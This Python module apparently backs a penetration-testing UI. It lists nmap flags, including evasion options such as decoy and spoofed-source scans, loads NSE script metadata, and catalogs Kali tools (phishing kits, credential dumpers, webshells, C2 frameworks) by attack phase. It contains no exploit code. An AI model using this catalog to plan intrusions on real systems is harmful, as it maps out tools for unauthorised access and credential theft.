"""
Scripts Library — canonical reference for pre-selection in UI.

Sources:
  - nmap.org/book/man.html (Options + NSE Script categories)
  - Local nmap 7.99 /usr/share/nmap/scripts/*.nse (612 scripts extracted)
  - kali.org/tools/ (725 tools across 17 categories)

Used by /api/v1/library endpoints to populate pre-select dropdowns in
PhasePanel so operators can choose from the canonical list instead of
typing freeform.
"""
from __future__ import annotations
import os
import re
from functools import lru_cache
from typing import Optional

# ---------------------------------------------------------------------------
# Nmap Options (from `nmap -h` + nmap.org/book/man.html)
# ---------------------------------------------------------------------------

NMAP_OPTIONS: list[dict] = [
    {"flag": "-sS", "category": "scan_type", "name": "TCP SYN", "desc": "Stealthy SYN scan (default w/ root)"},
    {"flag": "-sT", "category": "scan_type", "name": "TCP Connect", "desc": "Full TCP connect scan (no root needed)"},
    {"flag": "-sA", "category": "scan_type", "name": "TCP ACK", "desc": "Map firewall rulesets"},
    {"flag": "-sW", "category": "scan_type", "name": "TCP Window", "desc": "Window scan"},
    {"flag": "-sM", "category": "scan_type", "name": "TCP Maimon", "desc": "Maimon scan"},
    {"flag": "-sU", "category": "scan_type", "name": "UDP Scan", "desc": "UDP service scan (slow)"},
    {"flag": "-sN", "category": "scan_type", "name": "TCP Null", "desc": "Null scan (no flags)"},
    {"flag": "-sF", "category": "scan_type", "name": "TCP FIN", "desc": "FIN scan"},
    {"flag": "-sX", "category": "scan_type", "name": "TCP Xmas", "desc": "FIN+PSH+URG scan"},
    {"flag": "-sI <zombie>", "category": "scan_type", "name": "Idle Scan", "desc": "Idle scan via zombie host"},
    {"flag": "-sY", "category": "scan_type", "name": "SCTP INIT", "desc": "SCTP INIT scan"},
    {"flag": "-sZ", "category": "scan_type", "name": "SCTP COOKIE-ECHO", "desc": "SCTP COOKIE-ECHO scan"},
    {"flag": "-sO", "category": "scan_type", "name": "IP Protocol", "desc": "IP protocol scan"},
    {"flag": "-b <relay>", "category": "scan_type", "name": "FTP Bounce", "desc": "FTP bounce scan (legacy)"},
    {"flag": "-sV", "category": "service", "name": "Version Detection", "desc": "Probe open ports for service/version"},
    {"flag": "--version-light", "category": "service", "name": "Version Light", "desc": "Intensity 2"},
    {"flag": "--version-all", "category": "service", "name": "Version All", "desc": "Intensity 9 (slow)"},
    {"flag": "--version-intensity <n>", "category": "service", "name": "Version Intensity", "desc": "0-9"},
    {"flag": "-O", "category": "os", "name": "OS Detection", "desc": "Enable OS fingerprinting"},
    {"flag": "--osscan-limit", "category": "os", "name": "OS Scan Limit", "desc": "Only promising hosts"},
    {"flag": "--osscan-guess", "category": "os", "name": "OS Guess", "desc": "Aggressive guess"},
    {"flag": "-sC", "category": "script", "name": "Default Scripts", "desc": "Equivalent to --script=default"},
    {"flag": "--script=<list>", "category": "script", "name": "Custom Scripts", "desc": "Comma-separated NSE scripts"},
    {"flag": "--script-args", "category": "script", "name": "Script Args", "desc": "Pass args to scripts"},
    {"flag": "-A", "category": "combo", "name": "Aggressive", "desc": "-sV -O -sC + traceroute"},
    {"flag": "-Pn", "category": "discovery", "name": "Treat as Online", "desc": "Skip host discovery"},
    {"flag": "-sn", "category": "discovery", "name": "Ping Scan Only", "desc": "Disable port scan"},
    {"flag": "-PS", "category": "discovery", "name": "SYN Discovery", "desc": "TCP SYN ping"},
    {"flag": "-PA", "category": "discovery", "name": "ACK Discovery", "desc": "TCP ACK ping"},
    {"flag": "-PE", "category": "discovery", "name": "ICMP Echo", "desc": "ICMP echo ping"},
    {"flag": "-PP", "category": "discovery", "name": "ICMP Timestamp", "desc": "ICMP timestamp ping"},
    {"flag": "-PM", "category": "discovery", "name": "ICMP Netmask", "desc": "ICMP netmask ping"},
    {"flag": "-PO", "category": "discovery", "name": "IP Protocol Ping", "desc": "Raw proto ping"},
    {"flag": "--traceroute", "category": "discovery", "name": "Traceroute", "desc": "Trace hop path"},
    {"flag": "-p <ports>", "category": "ports", "name": "Port Spec", "desc": "e.g. -p 22,80 or -p- (all)"},
    {"flag": "--top-ports <n>", "category": "ports", "name": "Top Ports", "desc": "Scan top N most common"},
    {"flag": "-F", "category": "ports", "name": "Fast Scan", "desc": "Top 100 ports only"},
    {"flag": "--exclude-ports", "category": "ports", "name": "Exclude Ports", "desc": "Skip these ports"},
    {"flag": "-r", "category": "ports", "name": "Sequential", "desc": "Don't randomize order"},
    {"flag": "-T<0-5>", "category": "timing", "name": "Timing Template", "desc": "0=paranoid 5=insane (3=default)"},
    {"flag": "--max-retries", "category": "timing", "name": "Max Retries", "desc": "Probe retries"},
    {"flag": "--host-timeout", "category": "timing", "name": "Host Timeout", "desc": "Give up after time"},
    {"flag": "--min-rate", "category": "timing", "name": "Min Rate", "desc": "Packets/sec floor"},
    {"flag": "--max-rate", "category": "timing", "name": "Max Rate", "desc": "Packets/sec ceiling"},
    {"flag": "-f", "category": "evasion", "name": "Fragment", "desc": "Fragment packets"},
    {"flag": "--mtu", "category": "evasion", "name": "MTU", "desc": "Fragment with given MTU"},
    {"flag": "-D <decoys>", "category": "evasion", "name": "Decoy Scan", "desc": "Cloak with decoys"},
    {"flag": "-S <ip>", "category": "evasion", "name": "Spoof Source", "desc": "Source IP spoof"},
    {"flag": "-e <iface>", "category": "evasion", "name": "Interface", "desc": "Use given interface"},
    {"flag": "-g <port>", "category": "evasion", "name": "Source Port", "desc": "Use given source port"},
    {"flag": "--proxies", "category": "evasion", "name": "Proxies", "desc": "HTTP/SOCKS4 relay"},
    {"flag": "--data", "category": "evasion", "name": "Append Data", "desc": "Hex payload to sent packets"},
    {"flag": "--data-string", "category": "evasion", "name": "Append String", "desc": "ASCII payload"},
    {"flag": "--ttl", "category": "evasion", "name": "TTL", "desc": "Set IP TTL"},
    {"flag": "--badsum", "category": "evasion", "name": "Bad Checksum", "desc": "Bogus TCP/UDP/SCTP checksum"},
    {"flag": "-oN <file>", "category": "output", "name": "Normal Output", "desc": "Human-readable"},
    {"flag": "-oX <file>", "category": "output", "name": "XML Output", "desc": "For parsing"},
    {"flag": "-oG <file>", "category": "output", "name": "Grepable Output", "desc": "Grep-friendly"},
    {"flag": "-oA <base>", "category": "output", "name": "All Outputs", "desc": "All three formats"},
    {"flag": "-v", "category": "output", "name": "Verbose", "desc": "Increase verbosity (-vv, -vvv)"},
    {"flag": "-d", "category": "output", "name": "Debug", "desc": "Debug level"},
    {"flag": "--reason", "category": "output", "name": "Reason", "desc": "Display reason for state"},
    {"flag": "--open", "category": "output", "name": "Only Open", "desc": "Show only open/possibly open"},
    {"flag": "--packet-trace", "category": "output", "name": "Packet Trace", "desc": "Show sent/received"},
    {"flag": "--iflist", "category": "output", "name": "Interface List", "desc": "Print interfaces/routes"},
    {"flag": "--resume <file>", "category": "output", "name": "Resume Scan", "desc": "Resume aborted scan"},
    {"flag": "-6", "category": "general", "name": "IPv6", "desc": "Enable IPv6 scanning"},
    {"flag": "-iL <file>", "category": "general", "name": "Input List", "desc": "Read targets from file"},
    {"flag": "-iR <num>", "category": "general", "name": "Random Targets", "desc": "Choose random hosts"},
    {"flag": "--exclude", "category": "general", "name": "Exclude Hosts", "desc": "Comma-separated exclude"},
    {"flag": "--excludefile", "category": "general", "name": "Exclude File", "desc": "File with excludes"},
    {"flag": "-n", "category": "dns", "name": "No DNS", "desc": "Never do DNS resolution"},
    {"flag": "-R", "category": "dns", "name": "Always DNS", "desc": "Always resolve"},
    {"flag": "--dns-servers", "category": "dns", "name": "Custom DNS", "desc": "Use specific servers"},
    {"flag": "--system-dns", "category": "dns", "name": "System DNS", "desc": "Use OS resolver"},
]

# ---------------------------------------------------------------------------
# Nmap NSE Scripts (extracted from /usr/share/nmap/scripts/*.nse)
# ---------------------------------------------------------------------------

@lru_cache(maxsize=1)
def _load_nmap_scripts() -> list[dict]:
    scripts_dir = "/usr/share/nmap/scripts"
    if not os.path.isdir(scripts_dir):
        return []
    out = []
    for fn in sorted(os.listdir(scripts_dir)):
        if not fn.endswith(".nse"):
            continue
        name = fn[:-4]
        path = os.path.join(scripts_dir, fn)
        desc = ""
        categories: list[str] = []
        try:
            with open(path, "r", errors="ignore") as f:
                head = f.read(2000)
            # categories = {"safe", "auth", "broadcast", ...}
            cat_m = re.search(r"categories\s*=\s*\{([^}]+)\}", head)
            if cat_m:
                categories = [c.strip().strip('"').strip("'") for c in cat_m.group(1).split(",") if c.strip()]
            # description
            desc_m = re.search(r"description\s*=\s*\[\[?\s*([^\]\n]+)", head)
            if desc_m:
                desc = desc_m.group(1).strip()[:240]
        except Exception:
            pass
        # group key from first prefix
        prefix = name.split("-", 1)[0] if "-" in name else name
        out.append({"name": name, "categories": categories, "prefix": prefix, "desc": desc})
    return out

def list_nmap_scripts(category: Optional[str] = None, search: Optional[str] = None, limit: int = 500) -> list[dict]:
    scripts = _load_nmap_scripts()
    if category and category != "all":
        scripts = [s for s in scripts if category in s["categories"] or category == s["prefix"]]
    if search:
        q = search.lower()
        scripts = [s for s in scripts if q in s["name"].lower() or q in s["desc"].lower()]
    return scripts[:limit]

# Canonical NSE categories (per nmap.org/book/nse.html)
NSE_CATEGORIES = [
    {"name": "auth", "desc": "Auth-related scripts (bypassing, enumerating users)"},
    {"name": "broadcast", "desc": "Host/service discovery via broadcast"},
    {"name": "brute", "desc": "Brute force credential testing"},
    {"name": "default", "desc": "Run by default with -sC"},
    {"name": "discovery", "desc": "Active enumeration"},
    {"name": "dos", "desc": "Denial of service testing"},
    {"name": "exploit", "desc": "Active exploitation of vulnerabilities"},
    {"name": "external", "desc": "Queries external services (Shodan, etc.)"},
    {"name": "fuzzer", "desc": "Fuzzing probes"},
    {"name": "intrusive", "desc": "Likely to crash target or generate noise"},
    {"name": "malware", "desc": "Detect malware / backdoors"},
    {"name": "safe", "desc": "Non-intrusive, safe to run"},
    {"name": "version", "desc": "Version detection extension"},
    {"name": "vuln", "desc": "Vulnerability checks"},
]

# ---------------------------------------------------------------------------
# Kali Tools Catalog (from kali.org/tools/)
# ---------------------------------------------------------------------------

# Curated mapping derived from https://www.kali.org/tools/ — 17 MITRE-aligned categories
# Each entry: canonical command, description, source URL, category match to UCKC phases
KALI_CATALOG: list[dict] = [
    # Reconnaissance (142 tools)
    {"slug": "nmap", "name": "nmap", "cmd": "nmap", "category": "reconnaissance", "desc": "Network mapper / port scanner", "phases": [1, 10], "url": "https://www.kali.org/tools/nmap/"},
    {"slug": "masscan", "name": "masscan", "cmd": "masscan", "category": "reconnaissance", "desc": "Internet-scale port scanner", "phases": [1], "url": "https://www.kali.org/tools/masscan/"},
    {"slug": "amass", "name": "amass", "cmd": "amass", "category": "reconnaissance", "desc": "In-depth subdomain enumeration", "phases": [1], "url": "https://www.kali.org/tools/amass/"},
    {"slug": "assetfinder", "name": "assetfinder", "cmd": "assetfinder", "category": "reconnaissance", "desc": "Find domains/subdomains", "phases": [1], "url": "https://www.kali.org/tools/assetfinder/"},
    {"slug": "autorecon", "name": "autorecon", "cmd": "autorecon", "category": "reconnaissance", "desc": "Automated enumeration of multiple hosts", "phases": [1, 10], "url": "https://www.kali.org/tools/autorecon/"},
    {"slug": "recon-ng", "name": "recon-ng", "cmd": "recon-ng", "category": "reconnaissance", "desc": "Web reconnaissance framework", "phases": [1], "url": "https://www.kali.org/tools/recon-ng/"},
    {"slug": "theharvester", "name": "theHarvester", "cmd": "theHarvester", "category": "reconnaissance", "desc": "Email/subdomain/DNS enumerator", "phases": [1], "url": "https://www.kali.org/tools/theharvester/"},
    {"slug": "spiderfoot", "name": "spiderfoot", "cmd": "spiderfoot", "category": "reconnaissance", "desc": "OSINT automation", "phases": [1], "url": "https://www.kali.org/tools/spiderfoot/"},
    {"slug": "netdiscover", "name": "netdiscover", "cmd": "netdiscover", "category": "reconnaissance", "desc": "Active/passive ARP scanner", "phases": [1], "url": "https://www.kali.org/tools/netdiscover/"},
    {"slug": "arp-scan", "name": "arp-scan", "cmd": "arp-scan", "category": "reconnaissance", "desc": "ARP scanning tool", "phases": [1], "url": "https://www.kali.org/tools/arp-scan/"},
    {"slug": "dnsenum", "name": "dnsenum", "cmd": "dnsenum", "category": "reconnaissance", "desc": "DNS enumeration", "phases": [1], "url": "https://www.kali.org/tools/dnsenum/"},
    {"slug": "dnsrecon", "name": "dnsrecon", "cmd": "dnsrecon", "category": "reconnaissance", "desc": "DNS enumeration script", "phases": [1], "url": "https://www.kali.org/tools/dnsrecon/"},
    {"slug": "fierce", "name": "fierce", "cmd": "fierce", "category": "reconnaissance", "desc": "DNS brute-forcer", "phases": [1], "url": "https://www.kali.org/tools/fierce/"},
    {"slug": "subfinder", "name": "subfinder", "cmd": "subfinder", "category": "reconnaissance", "desc": "Passive subdomain enumeration", "phases": [1], "url": "https://www.kali.org/tools/subfinder/"},
    {"slug": "nuclei", "name": "nuclei", "cmd": "nuclei", "category": "reconnaissance", "desc": "Template-based vuln scanner", "phases": [1, 10], "url": "https://www.kali.org/tools/nuclei/"},
    {"slug": "dmitry", "name": "dmitry", "cmd": "dmitry", "category": "reconnaissance", "desc": "Deepmagic Information Gathering Tool", "phases": [1], "url": "https://www.kali.org/tools/dmitry/"},
    {"slug": "ike-scan", "name": "ike-scan", "cmd": "ike-scan", "category": "reconnaissance", "desc": "IKE/IPSec VPN scanner", "phases": [1], "url": "https://www.kali.org/tools/ike-scan/"},
    {"slug": "legion", "name": "legion", "cmd": "legion", "category": "reconnaissance", "desc": "Semi-automated network pen-test tool", "phases": [1], "url": "https://www.kali.org/tools/legion/"},
    {"slug": "maltego", "name": "maltego", "cmd": "maltego", "category": "reconnaissance", "desc": "Graph-based link analysis", "phases": [1], "url": "https://www.kali.org/tools/maltego/"},
    {"slug": "metagoofil", "name": "metagoofil", "cmd": "metagoofil", "category": "reconnaissance", "desc": "Metadata extractor from public docs", "phases": [1], "url": "https://www.kali.org/tools/metagoofil/"},
    # Resource Development
    {"slug": "exploitdb", "name": "exploitdb", "cmd": "searchsploit", "category": "resource-development", "desc": "Exploit-DB archive + searchsploit CLI", "phases": [2, 5], "url": "https://www.kali.org/tools/exploitdb/"},
    {"slug": "bed", "name": "bed", "cmd": "bed", "category": "resource-development", "desc": "Buffer overflow exploit dev", "phases": [2], "url": "https://www.kali.org/tools/bed/"},
    {"slug": "aflplusplus", "name": "afl++", "cmd": "afl-fuzz", "category": "resource-development", "desc": "American Fuzzy Lop fuzzer", "phases": [2], "url": "https://www.kali.org/tools/aflplusplus/"},
    {"slug": "apktool", "name": "apktool", "cmd": "apktool", "category": "resource-development", "desc": "Android APK reverse engineering", "phases": [2], "url": "https://www.kali.org/tools/apktool/"},
    {"slug": "bytecode-viewer", "name": "bytecode-viewer", "cmd": "bytecode-viewer", "category": "resource-development", "desc": "Java/Android bytecode viewer", "phases": [2], "url": "https://www.kali.org/tools/bytecode-viewer/"},
    {"slug": "dex2jar", "name": "dex2jar", "cmd": "dex2jar", "category": "resource-development", "desc": "DEX to JAR converter", "phases": [2], "url": "https://www.kali.org/tools/dex2jar/"},
    {"slug": "edb-debugger", "name": "edb-debugger", "cmd": "edb", "category": "resource-development", "desc": "Graphical debugger for Linux", "phases": [2], "url": "https://www.kali.org/tools/edb-debugger/"},
    {"slug": "jadx", "name": "jadx", "cmd": "jadx", "category": "resource-development", "desc": "Dex to Java decompiler", "phases": [2], "url": "https://www.kali.org/tools/jadx/"},
    {"slug": "msfvenom", "name": "msfvenom", "cmd": "msfvenom", "category": "resource-development", "desc": "Metasploit payload generator", "phases": [2, 12], "url": "https://www.kali.org/tools/metasploit-framework/"},
    {"slug": "mingw-w64", "name": "mingw-w64", "cmd": "x86_64-w64-mingw32-gcc", "category": "resource-development", "desc": "Windows cross-compiler", "phases": [2], "url": "https://www.kali.org/tools/mingw-w64/"},
    # Initial Access
    {"slug": "metasploit-framework", "name": "metasploit-framework", "cmd": "msfconsole", "category": "initial-access", "desc": "Metasploit exploitation framework", "phases": [3, 5, 8, 12, 14], "url": "https://www.kali.org/tools/metasploit-framework/"},
    {"slug": "commix", "name": "commix", "cmd": "commix", "category": "initial-access", "desc": "Command injection exploiter", "phases": [5], "url": "https://www.kali.org/tools/commix/"},
    {"slug": "sqlmap", "name": "sqlmap", "cmd": "sqlmap", "category": "initial-access", "desc": "Automatic SQL injection & DB takeover", "phases": [5], "url": "https://www.kali.org/tools/sqlmap/"},
    {"slug": "gophish", "name": "gophish", "cmd": "gophish", "category": "initial-access", "desc": "Phishing framework", "phases": [4], "url": "https://www.kali.org/tools/gophish/"},
    {"slug": "setoolkit", "name": "setoolkit", "cmd": "setoolkit", "category": "initial-access", "desc": "Social Engineer Toolkit", "phases": [4], "url": "https://www.kali.org/tools/setoolkit/"},
    {"slug": "king-phisher", "name": "king-phisher", "cmd": "king-phisher", "category": "initial-access", "desc": "Phishing campaign toolkit", "phases": [4], "url": "https://www.kali.org/tools/king-phisher/"},
    {"slug": "hydra", "name": "hydra", "cmd": "hydra", "category": "initial-access", "desc": "Parallelized network logon cracker", "phases": [5, 13], "url": "https://www.kali.org/tools/hydra/"},
    {"slug": "medusa", "name": "medusa", "cmd": "medusa", "category": "initial-access", "desc": "Parallel logon brute-forcer", "phases": [5, 13], "url": "https://www.kali.org/tools/medusa/"},
    {"slug": "patator", "name": "patator", "cmd": "patator", "category": "initial-access", "desc": "Multi-purpose brute-forcer", "phases": [5, 13], "url": "https://www.kali.org/tools/patator/"},
    {"slug": "crowbar", "name": "crowbar", "cmd": "crowbar", "category": "initial-access", "desc": "Brute force tool (SSH, RDP, VNC)", "phases": [5, 13], "url": "https://www.kali.org/tools/crowbar/"},
    # Execution
    {"slug": "nishang", "name": "nishang", "cmd": "nishang", "category": "execution", "desc": "PowerShell offensive framework", "phases": [12], "url": "https://www.kali.org/tools/nishang/"},
    {"slug": "powersploit", "name": "powersploit", "cmd": "powersploit", "category": "execution", "desc": "PowerShell post-exploitation", "phases": [12], "url": "https://www.kali.org/tools/powersploit/"},
    {"slug": "armitage", "name": "armitage", "cmd": "armitage", "category": "execution", "desc": "GUI for Metasploit", "phases": [5, 12], "url": "https://www.kali.org/tools/armitage/"},
    {"slug": "beef-xss", "name": "beef-xss", "cmd": "beef-xss", "category": "execution", "desc": "Browser Exploitation Framework", "phases": [5, 12], "url": "https://www.kali.org/tools/beef-xss/"},
    {"slug": "evil-winrm", "name": "evil-winrm", "cmd": "evil-winrm", "category": "execution", "desc": "WinRM shell for pentesting", "phases": [12, 14], "url": "https://www.kali.org/tools/evil-winrm/"},
    # Persistence
    {"slug": "backdoor-factory", "name": "backdoor-factory", "cmd": "backdoor-factory", "category": "persistence", "desc": "Patch ELF/PE with backdoors", "phases": [6], "url": "https://www.kali.org/tools/backdoor-factory/"},
    {"slug": "cymothoa", "name": "cymothoa", "cmd": "cymothoa", "category": "persistence", "desc": "ELF process injection backdoor", "phases": [6], "url": "https://www.kali.org/tools/cymothoa/"},
    {"slug": "weevely", "name": "weevely", "cmd": "weevely", "category": "persistence", "desc": "PHP webshell stealth backdoor", "phases": [6], "url": "https://www.kali.org/tools/weevely/"},
    {"slug": "webshells", "name": "webshells", "cmd": "webshells", "category": "persistence", "desc": "Pre-built web shells collection", "phases": [6], "url": "https://www.kali.org/tools/webshells/"},
    {"slug": "laudanum", "name": "laudanum", "cmd": "laudanum", "category": "persistence", "desc": "Collection of web shell payloads", "phases": [6], "url": "https://www.kali.org/tools/laudanum/"},
    {"slug": "phpggc", "name": "phpggc", "cmd": "phpggc", "category": "persistence", "desc": "PHP unserialize() payloads", "phases": [6], "url": "https://www.kali.org/tools/phpggc/"},
    # Privilege Escalation
    {"slug": "linpeas", "name": "linpeas", "cmd": "linpeas", "category": "privilege-escalation", "desc": "Linux PEAS privesc enumerator", "phases": [11], "url": "https://www.kali.org/tools/linpeas/"},
    {"slug": "winpeas", "name": "winPEAS", "cmd": "winPEAS", "category": "privilege-escalation", "desc": "Windows PEAS privesc enumerator", "phases": [11], "url": "https://www.kali.org/tools/winpeas/"},
    {"slug": "linux-exploit-suggester", "name": "linux-exploit-suggester", "cmd": "linux-exploit-suggester", "category": "privilege-escalation", "desc": "Suggest kernel exploits for Linux", "phases": [11], "url": "https://www.kali.org/tools/linux-exploit-suggester/"},
    {"slug": "windows-exploit-suggester", "name": "windows-exploit-suggester", "cmd": "windows-exploit-suggester", "category": "privilege-escalation", "desc": "Windows kernel exploit suggester", "phases": [11], "url": "https://www.kali.org/tools/windows-exploit-suggester/"},
    {"slug": "unix-privesc-check", "name": "unix-privesc-check", "cmd": "unix-privesc-check", "category": "privilege-escalation", "desc": "Shell script to check for privesc vectors", "phases": [11], "url": "https://www.kali.org/tools/unix-privesc-check/"},
    {"slug": "lynis", "name": "lynis", "cmd": "lynis", "category": "privilege-escalation", "desc": "System hardening/security audit", "phases": [11], "url": "https://www.kali.org/tools/lynis/"},
    {"slug": "beef", "name": "beef", "cmd": "beef", "category": "privilege-escalation", "desc": "Browser Exploitation Framework", "phases": [11], "url": "https://www.kali.org/tools/beef/"},
    # Defense Evasion
    {"slug": "veil", "name": "veil", "cmd": "veil", "category": "defense-evasion", "desc": "AV-evasion payload generator", "phases": [7], "url": "https://www.kali.org/tools/veil/"},
    {"slug": "shellter", "name": "shellter", "cmd": "shellter", "category": "defense-evasion", "desc": "Dynamic shellcode injection", "phases": [7], "url": "https://www.kali.org/tools/shellter/"},
    {"slug": "donut-shellcode", "name": "donut", "cmd": "donut", "category": "defense-evasion", "desc": "In-memory .NET assembly shellcode", "phases": [7], "url": "https://www.kali.org/tools/donut-shellcode/"},
    {"slug": "exe2hexbat", "name": "exe2hexbat", "cmd": "exe2hexbat", "category": "defense-evasion", "desc": "EXE to hex/hta/bat", "phases": [7], "url": "https://www.kali.org/tools/exe2hexbat/"},
    # Credential Access
    {"slug": "mimikatz", "name": "mimikatz", "cmd": "mimikatz", "category": "credential-access", "desc": "Windows credential extraction", "phases": [13], "url": "https://www.kali.org/tools/mimikatz/"},
    {"slug": "responder", "name": "responder", "cmd": "responder", "category": "credential-access", "desc": "LLMNR/NBT-NS/mDNS poisoner", "phases": [13], "url": "https://www.kali.org/tools/responder/"},
    {"slug": "impacket-scripts", "name": "impacket-scripts", "cmd": "impacket-scripts", "category": "credential-access", "desc": "Network protocol tool suite (psexec, secretsdump, etc.)", "phases": [12, 13, 14], "url": "https://www.kali.org/tools/impacket-scripts/"},
    {"slug": "secretsdump", "name": "secretsdump.py", "cmd": "secretsdump.py", "category": "credential-access", "desc": "DCSync / SAM/LSA secrets dump", "phases": [13], "url": "https://www.kali.org/tools/impacket-scripts/"},
    {"slug": "hashcat", "name": "hashcat", "cmd": "hashcat", "category": "credential-access", "desc": "World's fastest password cracker", "phases": [13], "url": "https://www.kali.org/tools/hashcat/"},
    {"slug": "john", "name": "john", "cmd": "john", "category": "credential-access", "desc": "John the Ripper password cracker", "phases": [13], "url": "https://www.kali.org/tools/john/"},
    {"slug": "cewl", "name": "cewl", "cmd": "cewl", "category": "credential-access", "desc": "Custom word list generator", "phases": [13], "url": "https://www.kali.org/tools/cewl/"},
    {"slug": "crackstation", "name": "crackstation-dict", "cmd": "crackstation", "category": "credential-access", "desc": "Lookup wordlist", "phases": [13], "url": "https://www.kali.org/tools/crackstation/"},
    {"slug": "aircrack-ng", "name": "aircrack-ng", "cmd": "aircrack-ng", "category": "credential-access", "desc": "WiFi security auditing suite", "phases": [13], "url": "https://www.kali.org/tools/aircrack-ng/"},
    {"slug": "bully", "name": "bully", "cmd": "bully", "category": "credential-access", "desc": "WPS brute force attack", "phases": [13], "url": "https://www.kali.org/tools/bully/"},
    {"slug": "wifite", "name": "wifite", "cmd": "wifite", "category": "credential-access", "desc": "Automated wireless auditor", "phases": [13], "url": "https://www.kali.org/tools/wifite/"},
    {"slug": "fern-wifi-cracker", "name": "fern-wifi-cracker", "cmd": "fern-wifi-cracker", "category": "credential-access", "desc": "WiFi GUI cracker", "phases": [13], "url": "https://www.kali.org/tools/fern-wifi-cracker/"},
    # Discovery
    {"slug": "bloodhound", "name": "bloodhound", "cmd": "bloodhound", "category": "discovery", "desc": "AD attack path mapper (GUI)", "phases": [10], "url": "https://www.kali.org/tools/bloodhound/"},
    {"slug": "bloodhound-ce-python", "name": "bloodhound-ce-python", "cmd": "bloodhound-ce-python", "category": "discovery", "desc": "BloodHound CE collector (Python)", "phases": [10], "url": "https://www.kali.org/tools/bloodhound-ce-python/"},
    {"slug": "enum4linux", "name": "enum4linux", "cmd": "enum4linux", "category": "discovery", "desc": "SMB/NetBIOS enumeration", "phases": [10], "url": "https://www.kali.org/tools/enum4linux/"},
    {"slug": "enum4linux-ng", "name": "enum4linux-ng", "cmd": "enum4linux-ng", "category": "discovery", "desc": "Next-gen SMB enum", "phases": [10], "url": "https://www.kali.org/tools/enum4linux-ng/"},
    {"slug": "smbclient", "name": "smbclient", "cmd": "smbclient", "category": "discovery", "desc": "Samba client (SMB/CIFS)", "phases": [10, 14, 15], "url": "https://www.kali.org/tools/smbclient/"},
    {"slug": "smbmap", "name": "smbmap", "cmd": "smbmap", "category": "discovery", "desc": "SMB share enumerator", "phases": [10, 14, 15], "url": "https://www.kali.org/tools/smbmap/"},
    {"slug": "rpcclient", "name": "rpcclient", "cmd": "rpcclient", "category": "discovery", "desc": "MS-RPC client", "phases": [10], "url": "https://www.kali.org/tools/rpcclient/"},
    {"slug": "snmpcheck", "name": "snmpcheck", "cmd": "snmpcheck", "category": "discovery", "desc": "SNMP enumeration", "phases": [10], "url": "https://www.kali.org/tools/snmpcheck/"},
    {"slug": "snmpwalk", "name": "snmpwalk", "cmd": "snmpwalk", "category": "discovery", "desc": "SNMP tree walk", "phases": [10], "url": "https://www.kali.org/tools/snmpwalk/"},
    {"slug": "onesixtyone", "name": "onesixtyone", "cmd": "onesixtyone", "category": "discovery", "desc": "SNMP brute force community strings", "phases": [10], "url": "https://www.kali.org/tools/onesixtyone/"},
    # Lateral Movement
    {"slug": "crackmapexec", "name": "crackmapexec", "cmd": "crackmapexec", "category": "lateral-movement", "desc": "AD/Windows Swiss army knife (now netexec)", "phases": [14], "url": "https://www.kali.org/tools/crackmapexec/"},
    {"slug": "netexec", "name": "netexec", "cmd": "netexec", "category": "lateral-movement", "desc": "Network service exploitation (CME successor)", "phases": [14], "url": "https://www.kali.org/tools/netexec/"},
    {"slug": "psexec", "name": "psexec.py", "cmd": "psexec.py", "category": "lateral-movement", "desc": "Impacket psexec for remote exec", "phases": [12, 14], "url": "https://www.kali.org/tools/impacket-scripts/"},
    {"slug": "wmiexec", "name": "wmiexec.py", "cmd": "wmiexec.py", "category": "lateral-movement", "desc": "Impacket WMI exec", "phases": [12, 14], "url": "https://www.kali.org/tools/impacket-scripts/"},
    {"slug": "atexec", "name": "atexec.py", "cmd": "atexec.py", "category": "lateral-movement", "desc": "Impacket task scheduler exec", "phases": [12, 14], "url": "https://www.kali.org/tools/impacket-scripts/"},
    {"slug": "dcomexec", "name": "dcomexec.py", "cmd": "dcomexec.py", "category": "lateral-movement", "desc": "Impacket DCOM exec", "phases": [12, 14], "url": "https://www.kali.org/tools/impacket-scripts/"},
    {"slug": "mssqlclient", "name": "mssqlclient.py", "cmd": "mssqlclient.py", "category": "lateral-movement", "desc": "Impacket MSSQL client", "phases": [12, 14], "url": "https://www.kali.org/tools/impacket-scripts/"},
    # Collection
    {"slug": "httrack", "name": "httrack", "cmd": "httrack", "category": "collection", "desc": "Website copier", "phases": [15], "url": "https://www.kali.org/tools/httrack/"},
    {"slug": "wafw00f", "name": "wafw00f", "cmd": "wafw00f", "category": "collection", "desc": "WAF fingerprinting", "phases": [1, 15], "url": "https://www.kali.org/tools/wafw00f/"},
    {"slug": "ferret-sidejack", "name": "ferret-sidejack", "cmd": "ferret-sidejack", "category": "collection", "desc": "HTTP session sidejacker", "phases": [15], "url": "https://www.kali.org/tools/ferret-sidejack/"},
    {"slug": "hamster-sidejack", "name": "hamster-sidejack", "cmd": "hamster-sidejack", "category": "collection", "desc": "HTTP session sidejacker", "phases": [15], "url": "https://www.kali.org/tools/hamster-sidejack/"},
    {"slug": "emailharvester", "name": "emailharvester", "cmd": "emailharvester", "category": "collection", "desc": "Email scraper from public sources", "phases": [15], "url": "https://www.kali.org/tools/emailharvester/"},
    # Command and Control
    {"slug": "sliver", "name": "sliver", "cmd": "sliver", "category": "command-and-control", "desc": "Cross-platform C2 framework", "phases": [8], "url": "https://www.kali.org/tools/sliver/"},
    {"slug": "covenant", "name": "covenant", "cmd": "covenant", "category": "command-and-control", "desc": ".NET C2 framework", "phases": [8], "url": "https://www.kali.org/tools/covenant/"},
    {"slug": "chisel", "name": "chisel", "cmd": "chisel", "category": "command-and-control", "desc": "TCP/UDP tunnel (pivoting)", "phases": [8, 9], "url": "https://www.kali.org/tools/chisel/"},
    {"slug": "ligolo-ng", "name": "ligolo-ng", "cmd": "ligolo-ng", "category": "command-and-control", "desc": "Modern tunneling/pivoting tool", "phases": [9], "url": "https://www.kali.org/tools/ligolo-ng/"},
    {"slug": "dnscat2", "name": "dnscat2", "cmd": "dnscat2", "category": "command-and-control", "desc": "DNS tunnel C2", "phases": [8], "url": "https://www.kali.org/tools/dnscat2/"},
    {"slug": "iodine", "name": "iodine", "cmd": "iodine", "category": "command-and-control", "desc": "DNS tunnel", "phases": [8, 9], "url": "https://www.kali.org/tools/iodine/"},
    {"slug": "ptunnel", "name": "ptunnel", "cmd": "ptunnel", "category": "command-and-control", "desc": "ICMP tunnel", "phases": [8, 9], "url": "https://www.kali.org/tools/ptunnel/"},
    # Exfiltration
    {"slug": "exfiltration", "name": "exfil-tools", "cmd": "exfil", "category": "exfiltration", "desc": "Misc exfiltration helpers", "phases": [16], "url": "https://www.kali.org/tools/"},
